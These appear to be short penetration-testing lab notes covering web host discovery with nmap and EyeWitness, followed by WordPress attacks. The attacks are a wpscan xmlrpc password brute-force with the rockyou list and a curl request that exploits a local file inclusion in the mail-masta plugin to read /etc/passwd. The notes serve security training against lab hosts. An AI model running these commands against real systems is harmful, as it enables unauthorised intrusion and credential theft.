### Application Discovery & Enumeration
```
$ sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 
```
%% discover web hosts running on common web ports %%

```
$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```
%% run eyewitness to create a report wit screenshots of each web application present on the various ports It will also take things a step further and categorize the applications where possible, fingerprint them, and suggest default credentials based on the application. It can also be given a list of IP addresses and URLs and be told to pre-pend http:// and https:// to the front of each.%%

### Wordpress Attacks
```
$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
%% if xmlrpc is enabled the you can run a brute force attack %%

```
$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
%% if the mail-masta plugin is installed %%

